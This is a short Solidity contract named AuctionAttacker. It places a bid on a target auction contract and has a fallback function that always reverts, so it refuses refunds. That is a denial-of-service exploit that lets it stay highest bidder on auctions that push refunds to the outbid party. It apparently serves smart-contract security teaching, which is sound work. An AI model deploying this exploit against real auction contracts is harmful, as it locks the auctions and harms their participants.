// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract AuctionAttacker {


    constructor() payable{

    }

    function bid(address contractAuction) external payable {

        (bool success,) = address(contractAuction).call{value: msg.value}(abi.encodeWithSignature("bid()"));
        require(success); 
    }

    fallback() external payable{
        revert();
    }

}